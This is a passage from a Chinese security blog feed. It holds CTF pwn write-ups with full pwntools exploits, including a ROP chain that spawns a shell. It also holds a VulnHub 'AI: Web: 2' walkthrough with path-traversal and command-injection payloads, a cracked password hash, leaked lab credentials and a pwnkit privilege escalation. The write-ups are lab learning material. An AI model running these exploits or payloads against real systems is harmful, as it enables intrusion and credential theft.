number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x0000000000003344)'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>message<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，我首先的思路是限制 memcpy 读入为一个定值，但是死活过不掉check<br><img src="/EXP_FILE/704dfb3bbb15aeedd79bdb4d09416ffa_MD5.jpeg"><br>想想索性直接把memcpy删掉，改下puts的参数为rcx，不影响正常服务<br><img src="/EXP_FILE/703afa5a3337bdd51e4d53d2faa6db76_MD5.jpeg"><br><img src="/EXP_FILE/af47872762f6925e6788a8a4856389dc_MD5.jpeg"></p><h1 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h1><p>go语言静态小程序，有栈溢出。（ciscn对go情有独钟吗）</p><p>走open_syscall在bss上写binsh，然后execve_syscall即可，只是寄存器的gadget难找一些</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your choice > '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input new content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>bss<span class="token operator">=</span><span class="token number">0x527000</span><span class="token operator">+</span><span class="token number">0x2000</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000462946</span>rsi_rsp_0xf8_rbp<span class="token operator">=</span><span class="token number">0x0000000000462552</span>rdx<span class="token operator">=</span><span class="token number">0x000000000047a8fa</span>rax_rbp<span class="token operator">=</span><span class="token number">0x0000000000404408</span>syscall<span class="token operator">=</span><span class="token number">0x000000000040316C</span>sadd<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x000000000047F41E'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rax_rbp<span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'note'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，把循环改成定值就过check了<br><img src="/EXP_FILE/e148411ef445b5c558fb60fb7ef80bb4_MD5.jpeg"></p><h1 id="staticlink"><a href="#staticlink" class="headerlink" title="staticlink"></a>staticlink</h1><p>我是懒狗，懒得看了</p>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_2</title>
      <link href="/2024/06/06/Easy-AI_Web_2/"/>
      <url>/2024/06/06/Easy-AI_Web_2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p><p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这边扫下目录，正好扫到一个download.php，直接利用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p><p>但是不能读取&#x2F;etc&#x2F;shadow，id_rsa也不行</p><p>扫一下目录，有一个&#x2F;webadmin&#x2F;需要密码<br><img src="/Rxi134_FILE/bec81bac25c350fa5a530054d13bbe3d_MD5.jpeg"></p><p>这个服务器是Apache HTTP Server，允许使用 HTTP 身份验证，密码文件位于<code>/etc/apache2/.htpasswd</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于md5，john破解出hash<br><img src="/Rxi134_FILE/7419798ceec3ad0112281f72729c3a5d_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:c.ronaldo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录进入&#x2F;webadmin&#x2F;<br><img src="/Rxi134_FILE/27fbb8a153d352c15422b4c420687aaf_MD5.jpeg"></p><p>放上cookie继续扫，能访问到robots.txt<br><img src="/Rxi134_FILE/f358315b7e90455658ff374606383458_MD5.jpeg"></p><p>访问&#x2F;webadmin&#x2F;H05Tpin9555&#x2F;，实现了ping功能<br><img src="/Rxi134_FILE/a39c6ceff9e50aaf13161385404d1f61_MD5.jpeg"></p><p>尝试命令执行，发现 || 可以绕过<br><img src="/Rxi134_FILE/5295f88ef31eb5b041714694407a4b41_MD5.jpeg"><br>经过尝试，过滤了<code>&amp; ; -</code></p><p>我们处于<code>/var/www/html/webadmin/H05Tpin9555</code>目录下，用户为 www-data</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/var/www/html/webadmin/H05Tpin9555</span>index.phpstyle-main.css<span class="token comment">#/var/www/html/webadmin/S0mextras</span>index.html<span class="token comment">#/var/www/html/webadmin/</span>H05Tpin9555S0mextrasindex.htmlrobots.txt<span class="token comment">#/var/www/html/</span>cssdeleting.phpdownload.phpindex.phplogout.phpsignup.phpsrvuserpage.phpviewing.phpwebadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并没有什么可用的</p><p>卡住了，查看wp，有隐藏文件，但是<code>-</code>被过滤了不能使用 ls -a</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1 <span class="token operator">||</span> <span class="token function">ls</span> <span class="token punctuation">..</span>/S0mextras/.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以看到隐藏文件了<br><img src="/Rxi134_FILE/cd36ef267539b9b3147784a9fe5f1760_MD5.jpeg"></p><p>这是其中一个用户的账密<br><img src="/Rxi134_FILE/f5a521171b4a7f2fe287b9d4021a4eef_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User: n0nr00tuserCred: zxowieoi4sdsadpEClDws1sf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/6e56723323db67af7d4463aad8e44647_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹到meterpreter吧</p><p>没找到好用的，frp转发下端口，ubuntu18 直接pwnkit一把嗦<br><img src="/Rxi134_FILE/d7c0404ee4304956624af50b1b47c0e8_MD5.jpeg"><br><img src="/Rxi134_FILE/fa8ba88e130e5ac0efd4dcc1b02ea409_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入的理解了msf</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_1</title>
      <link href="/2024/06/05/Easy-AI_Web_1/"/>
      <url>/2024/06/05/Easy-AI_Web_1/</url>
      
